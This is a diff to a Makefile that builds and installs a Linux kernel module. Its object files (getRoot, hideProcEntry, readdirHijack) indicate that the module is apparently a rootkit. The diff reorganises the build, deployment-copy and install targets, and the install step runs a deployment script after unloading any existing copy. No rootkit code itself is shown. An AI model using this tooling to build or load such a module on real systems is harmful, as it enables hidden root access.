@@ -16,27 +16,36 @@ blank-objs += getRoot.o hideProcEntry.o communication.o readdirHijack.o processH
 
 #TODO: fix location buffer is build - Ensure "buffer/makefile"  does not generate a conflicting ".o" file
 
-PWD = $(shell pwd)
+BUILDDIR = $(shell pwd)
 
 #todo: automatically run buffer test
 
-all: environmentSpecificOptions.h
-	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) modules
-clean:
-	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) clean
+default: all
 
-environmentSpecificOptions.h: 	 # we probably should avoid the need to be root to compile
-	./getEnvironmentSpecificOptions.sh > environmentSpecificOptions.h
-	
-
-deploy: all
-	cp deploymentTemplate/*.sh blank.ko  "deployment/"
-	
-install: all uninstallSilently
-	insmod ./$(moduleName).ko
+install: uninstallSilently all
+	./deployment/install.sh
 
 uninstall:
 	-rmmod $(moduleName)
 	
 uninstallSilently:
 	-@rmmod $(moduleName)
+
+# setupDeployment: bulildModule
+# 	mkdir "deployment" -p
+# 	cp deploymentTemplate/*.sh blank.ko  "deployment/"
+
+all: environmentSpecificOptions.h
+	mkdir "deployment" -p
+	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(BUILDDIR) modules
+	cp deploymentTemplate/*.sh blank.ko "deployment/"
+	
+clean:
+	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(BUILDDIR) clean
+	rm -r "deployment"
+
+environmentSpecificOptions.h: 	 # we probably should avoid the need to be root to compile
+	./getEnvironmentSpecificOptions.sh > environmentSpecificOptions.h
+
+
+	
